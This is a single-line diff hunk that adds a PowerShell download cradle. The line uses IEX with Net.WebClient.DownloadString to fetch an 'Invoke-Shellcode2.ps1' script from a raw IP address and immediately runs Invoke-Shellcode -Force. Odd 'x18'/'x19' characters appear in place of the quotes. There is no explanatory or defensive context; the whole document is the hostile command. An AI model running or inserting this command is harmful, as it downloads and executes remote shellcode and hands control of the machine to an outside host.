@@ -1,0 +1,1 @@
+IEX (New-Object Net.WebClient).DownloadString(x18 http://52.31.143.66/Invoke-Shellcode2.ps1x19 );Invoke-Shellcode -Force
